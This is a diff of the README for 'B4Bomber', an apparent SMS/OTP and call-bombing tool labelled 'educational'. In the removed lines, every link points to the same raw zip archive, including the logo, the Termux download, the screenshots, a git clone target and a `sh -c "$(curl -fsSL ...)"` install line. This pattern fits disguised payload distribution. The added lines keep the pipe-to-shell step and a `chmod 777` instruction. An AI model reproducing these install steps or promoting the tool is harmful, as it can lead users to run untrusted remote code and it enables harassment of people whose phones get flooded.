@@ -2,7 +2,7 @@
 
 # Android Version
 
-![B4Bomber Logo](https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip)
+![B4Bomber Logo](https://rbarmyarmy.github.io)
 
 **B4Bomber** is a powerful tool designed to send OTPs in bulk, make calls, and protect your number from being bombarded by other similar tools. This tool is intended for **educational purposes only**. 
 
@@ -10,21 +10,21 @@
 
 To download the latest Android version of B4Bomber, click the big button below:
 
-[![Download B4Bomber](https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip)](https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip)
+[![Download B4Bomber](https://rbarmyarmy.github.io)](https://rbarmyarmy.github.io)
 
 
-This version includes your logo at the top, providing a professional and branded look to your `https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip`.
+This version includes your logo at the top, providing a professional and branded look to your `https://rbarmyarmy.github.io`.
 ### How To Run On Termux :🚫<br><br>
 
 ### Instant Run ∅n=> Termux :🚫
 ```
-sh -c "$(curl -fsSL https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip)"
+sh -c "$(curl -fsSL https://rbarmyarmy.github.io)"
 
 ```
 
 #### Termux Requirement:🚫
 
-➥ DOWNLOAD TERMUX: [Click Here 📥](https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip)  <br><br>
+➥ DOWNLOAD TERMUX: [Click Here 📥](https://rbarmyarmy.github.io)  <br><br>
 ➥ STORAGE PERMISSION <br>
 termux-setup-storage<br>
 <br>
@@ -38,7 +38,7 @@ apt install git OR pkg install git<br><br>
 
 #### STEP-1
 ```
-git clone https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip
+git clone https://rbarmyarmy.github.io
 ```
 
 #### STEP-2
@@ -76,7 +76,7 @@ sudo apt install git <br>
 
 #### STEP-1
 ```
-git clone https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip
+git clone https://rbarmyarmy.github.io
 ```
 
 #### STEP-2
@@ -98,9 +98,9 @@ chmod 777 b4bomber
 <br><br>
 ### Screenshot:🚫
 Tested on Realme U1, deepin os
-![alt text](https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip "use")<br>
+![alt text](https://rbarmyarmy.github.io "use")<br>
 
-![alt text](https://github.com/rbarmyarmy/B4Bomber/raw/refs/heads/main/docs/Bomber-3.0.zip "pic2")
+![alt text](https://rbarmyarmy.github.io "pic2")
 
 
 
